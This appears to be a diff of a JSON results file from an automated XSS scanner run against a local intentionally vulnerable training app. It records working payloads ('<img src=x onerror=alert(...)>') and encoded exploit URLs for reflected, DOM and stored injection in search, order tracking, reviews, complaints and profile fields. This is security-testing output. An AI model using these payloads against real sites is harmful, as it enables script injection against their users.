@@ -5,7 +5,7 @@
     "findings": [],
     "requests": 69,
     "targets": 38,
-    "secs": 69.7,
+    "secs": 74.4,
     "session": "shared",
     "surface": {
       "key": "home",
@@ -23,10 +23,10 @@
         "param": "q",
         "ctx": "html_text",
         "verified_by": "browser",
-        "payload": "<img src=x onerror=alert('ixm03bac14b')>",
+        "payload": "<img src=x onerror=alert(`ixm03bac14b`)>",
         "type": "dom",
         "method": "GET",
-        "url": "http://127.0.0.1:3000/#/search?q=%3Cimg+src%3Dx+onerror%3Dalert%28%27ixm03bac14b%27%29%3E",
+        "url": "http://127.0.0.1:3000/#/search?q=%3Cimg+src%3Dx+onerror%3Dalert%28%60ixm03bac14b%60%29%3E",
         "marker": "ixm03bac14b",
         "replay": {
           "status": 0,
@@ -40,7 +40,7 @@
     ],
     "requests": 69,
     "targets": 38,
-    "secs": 70.6,
+    "secs": 75.3,
     "session": "shared",
     "surface": {
       "key": "search",
@@ -53,6 +53,43 @@
     }
   },
   {
+    "key": "track",
+    "status": "ok",
+    "findings": [
+      {
+        "param": "id",
+        "ctx": "html_text",
+        "verified_by": "browser",
+        "payload": "<img src=x onerror=alert(`ixm866b973f`)>",
+        "type": "dom",
+        "method": "GET",
+        "url": "http://127.0.0.1:3000/#/track-result?id=%3Cimg+src%3Dx+onerror%3Dalert%28%60ixm866b973f%60%29%3E",
+        "marker": "ixm866b973f",
+        "replay": {
+          "status": 200,
+          "echoed": true,
+          "stored": false,
+          "dom": true,
+          "marker": "ixm866b973f"
+        }
+      }
+    ],
+    "requests": 69,
+    "targets": 38,
+    "secs": 74.3,
+    "session": "shared",
+    "surface": {
+      "key": "track",
+      "challenge": "reflectedXssChallenge",
+      "page": "/",
+      "endpoint": "/rest/track-order/:id",
+      "route": "/track-result",
+      "field": "id",
+      "replay": "/rest/track-order/:id",
+      "note": "`GET /rest/track-order/:id` returns the id it was given and the tracking page renders it through `bypassSecurityTrustHtml`, so the route the payload travels in is a fragment and the sink is on the API behind it. The replay addresses that handler with the finding's own payload."
+    }
+  },
+  {
     "key": "reviews",
     "status": "ok",
     "findings": [
@@ -60,22 +97,22 @@
         "param": "message",
         "ctx": "html_text",
         "verified_by": "reflection",
-        "payload": "<img src=x onerror=alert('ixm1994f906')>",
+        "payload": "<img src=x onerror=alert('ixm7731e8ba')>",
         "type": "stored",
         "method": "PUT",
         "url": "http://127.0.0.1:3000/rest/products/1/reviews",
-        "marker": "ixm1994f906",
+        "marker": "ixm7731e8ba",
         "replay": {
           "status": 201,
           "echoed": false,
           "stored": true,
-          "marker": "ixm1994f906"
+          "marker": "ixm7731e8ba"
         }
       }
     ],
     "requests": 69,
     "targets": 38,
-    "secs": 68.8,
+    "secs": 74.7,
     "session": "shared",
     "surface": {
       "key": "reviews",
@@ -93,7 +130,7 @@
     "findings": [],
     "requests": 69,
     "targets": 38,
-    "secs": 69.1,
+    "secs": 74.1,
     "session": "shared",
     "surface": {
       "key": "feedback",
@@ -113,22 +150,22 @@
         "param": "message",
         "ctx": "html_text",
         "verified_by": "browser",
-        "payload": "<img src=x onerror=alert('ixm82163f7b')>",
+        "payload": "<img src=x onerror=alert('ixm84a9dfef')>",
         "type": "stored",
         "method": "POST",
         "url": "http://127.0.0.1:3000/api/Complaints",
-        "marker": "ixm82163f7b",
+        "marker": "ixm84a9dfef",
         "replay": {
           "status": 201,
           "echoed": true,
           "stored": true,
-          "marker": "ixm82163f7b"
+          "marker": "ixm84a9dfef"
         }
       }
     ],
     "requests": 69,
     "targets": 38,
-    "secs": 71.1,
+    "secs": 71.0,
     "session": "shared",
     "surface": {
       "key": "complaints",
@@ -148,24 +185,24 @@
         "param": "localStorage",
         "ctx": "url_fragment",
         "verified_by": "browser",
-        "payload": "<img src=x onerror=alert('ixm82866704')>",
+        "payload": "<img src=x onerror=alert('ixm80182528')>",
         "type": "dom",
         "method": "GET",
         "url": "http://127.0.0.1:3000/#/privacy-security/last-login-ip",
-        "marker": "ixm82866704",
+        "marker": "ixm80182528",
         "replay": {
           "status": 0,
           "echoed": false,
           "stored": false,
           "dom": true,
-          "marker": "ixm82866704",
+          "marker": "ixm80182528",
           "note": "hash route: execution is browser-only"
         }
       }
     ],
     "requests": 69,
     "targets": 38,
-    "secs": 65.4,
+    "secs": 64.1,
     "session": "account",
     "surface": {
       "key": "last-login-ip",
@@ -190,22 +227,22 @@
         "param": "username",
         "ctx": "html_text",
         "verified_by": "browser",
-        "payload": "<img src=x onerror=alert('ixm47cf91a6')>",
+        "payload": "<img src=x onerror=alert('ixmd1c4eda3')>",
         "type": "stored",
         "method": "POST",
         "url": "http://127.0.0.1:3000/profile",
-        "marker": "ixm47cf91a6",
+        "marker": "ixmd1c4eda3",
         "replay": {
           "status": 200,
           "echoed": true,
           "stored": true,
-          "marker": "ixm47cf91a6"
+          "marker": "ixmd1c4eda3"
         }
       }
     ],
     "requests": 10,
     "targets": 8,
-    "secs": 14.8,
+    "secs": 14.6,
     "session": "account",
     "surface": {
       "key": "profile",
@@ -224,7 +261,7 @@
     "findings": [],
     "requests": 69,
     "targets": 38,
-    "secs": 69.0,
+    "secs": 67.6,
     "session": "shared",
     "surface": {
       "key": "login",
